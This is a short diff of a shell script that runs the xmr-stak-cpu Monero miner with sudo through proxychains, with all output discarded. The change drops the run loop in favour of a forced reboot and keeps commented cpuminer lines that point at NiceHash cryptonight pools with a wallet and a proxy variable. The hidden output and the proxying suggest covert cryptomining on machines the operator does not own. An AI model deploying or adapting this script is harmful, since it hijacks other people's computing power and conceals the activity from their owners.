@@ -15,9 +15,10 @@ sudo chmod +x /m/test01/proxychains/proxychains4
 sudo chmod +x /m/test01/xmr/xmr-stak-cpu
 sudo chmod +x /m/test01/proxychains/libproxychains4.so
 
-while true; do
+#while true; do
+cd /m/test01/xmr/
 sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
-#sudo reboot
+sudo reboot
 # sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
 # sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
-done
+#done
